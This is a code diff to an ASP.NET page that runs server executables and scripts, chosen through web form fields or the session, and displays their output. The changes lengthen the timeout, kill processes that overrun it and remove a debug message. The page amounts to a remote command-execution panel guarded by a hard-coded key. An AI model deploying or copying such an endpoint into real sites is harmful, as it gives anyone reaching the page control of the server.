@@ -8,7 +8,7 @@
 // CONFIGURATION  -- only section you should ever need to edit
 // ============================================================
 private const string SERVER_KEY     = "MyS3cr3tServerK3y!"; // change this
-private const int    EXEC_TIMEOUT_MS = 5000;                 // process wait time
+private const int    EXEC_TIMEOUT_MS = 30000;                // process wait time
 private static readonly string[] EXE_EXTENSIONS =
     { ".exe", ".bat", ".cmd", ".ps1", ".sh" };
 
@@ -375,11 +375,6 @@ protected void BtnExec_Click(object sender, EventArgs e)
     string _hExePlain    = F("hExePathPlain");
     string _sessRunExe   = GetSess("runExe");
     string _decrypted    = Dec(_hExePath);
-    // Show debug so we can see exactly what arrived
-    Msg("DBG hExePath=" + (_hExePath.Length > 0 ? _hExePath.Substring(0,Math.Min(12,_hExePath.Length))+"..." : "(empty)") +
-        " | plain=" + (_hExePlain.Length > 0 ? _hExePlain.Substring(0,Math.Min(20,_hExePlain.Length)) : "(empty)") +
-        " | sess=" + (_sessRunExe.Length > 0 ? _sessRunExe.Substring(0,Math.Min(20,_sessRunExe.Length)) : "(empty)") +
-        " | dec=" + (_decrypted.Length > 0 ? _decrypted.Substring(0,Math.Min(20,_decrypted.Length)) : "(empty)"), "info");
     // Priority: session (most reliable) > plain field > decrypted
     string fp = _sessRunExe;
     if (string.IsNullOrEmpty(fp)) fp = _hExePlain;
@@ -390,42 +385,63 @@ protected void BtnExec_Click(object sender, EventArgs e)
     {
         var psi = new ProcessStartInfo
         {
-            FileName = fp, Arguments = TxtExeArgs.Text,
+            FileName               = fp,
+            Arguments              = TxtExeArgs.Text,
             WorkingDirectory       = Path.GetDirectoryName(fp),
-            RedirectStandardOutput = true, RedirectStandardError = true,
-            UseShellExecute = false, CreateNoWindow = true
+            RedirectStandardOutput = true,
+            RedirectStandardError  = true,
+            UseShellExecute        = false,
+            CreateNoWindow         = true,
+            StandardOutputEncoding = Encoding.UTF8,
+            StandardErrorEncoding  = Encoding.UTF8,
         };
         var proc = new Process { StartInfo = psi };
         proc.Start();
-        // Read stdout and stderr asynchronously BEFORE WaitForExit to prevent
-        // deadlock: if the process fills the output buffer it blocks waiting for
-        // a reader, while WaitForExit blocks waiting for the process -- deadlock.
+
+        // Read stdout and stderr on background threads to prevent deadlock
+        // (a full pipe buffer blocks the child; WaitForExit blocks us → deadlock).
         var stdoutTask = System.Threading.Tasks.Task.Run(() => proc.StandardOutput.ReadToEnd());
         var stderrTask = System.Threading.Tasks.Task.Run(() => proc.StandardError.ReadToEnd());
-        bool done   = proc.WaitForExit(EXEC_TIMEOUT_MS);
-        string out_ = stdoutTask.Result;
-        string err_ = stderrTask.Result;
+
+        bool done = proc.WaitForExit(EXEC_TIMEOUT_MS);
+
+        if (!done)
+        {
+            // Give the reader tasks a short extra window to drain whatever
+            // was already written before we kill the process.
+            System.Threading.Tasks.Task.WaitAll(
+                new System.Threading.Tasks.Task[] { stdoutTask, stderrTask }, 1000);
+            try { proc.Kill(); } catch { }
+        }
+
+        // After WaitForExit(timeout) returns true the streams may not be fully
+        // flushed yet; calling WaitForExit() (no-arg) ensures the async reads
+        // on the redirected handles are complete before we read the tasks.
+        if (done) proc.WaitForExit();
+
+        string out_ = stdoutTask.IsCompleted ? stdoutTask.Result : "";
+        string err_ = stderrTask.IsCompleted ? stderrTask.Result : "";
 
         var sb = new StringBuilder();
         sb.AppendLine("=== " + fp + " " + TxtExeArgs.Text);
-        sb.AppendLine("=== Exit: " + (done ? proc.ExitCode.ToString() : "timeout") + " ===");
+        sb.AppendLine("=== Exit: " + (done ? proc.ExitCode.ToString() : "killed (timeout)") + " ===");
         if (!string.IsNullOrEmpty(out_)) sb.AppendLine(out_);
         if (!string.IsNullOrEmpty(err_)) { sb.AppendLine("--- STDERR ---"); sb.AppendLine(err_); }
-        if (!done) sb.AppendLine("(Process still running - output captured so far)");
+        if (!done) sb.AppendLine("(Process exceeded timeout and was killed.)");
 
         string output = sb.ToString();
-                LitExecOutput.Text        = Server.HtmlEncode(output).Replace("\r", "").Replace("\n", "<br/>");
-        PanelExecResult.Visible   = true;
+        LitExecOutput.Text      = Server.HtmlEncode(output).Replace("\r", "").Replace("\n", "<br/>");
+        PanelExecResult.Visible = true;
         SetSess("panel", "exec");
         RenderListing();
-        Msg("Executed: " + Path.GetFileName(fp) + (done ? " (exit " + proc.ExitCode + ")" : " (timeout)"),
+        Msg("Executed: " + Path.GetFileName(fp) + (done ? " (exit " + proc.ExitCode + ")" : " (timeout — killed)"),
             done && proc.ExitCode == 0 ? "ok" : "err");
     }
     catch (Exception ex)
     {
         string output = "ERROR: " + ex.Message;
-                LitExecOutput.Text        = Server.HtmlEncode(output);
-        PanelExecResult.Visible   = true;
+        LitExecOutput.Text      = Server.HtmlEncode(output);
+        PanelExecResult.Visible = true;
         SetSess("panel","exec");
         RenderListing();
         Msg("Exec failed: " + ex.Message, "err");
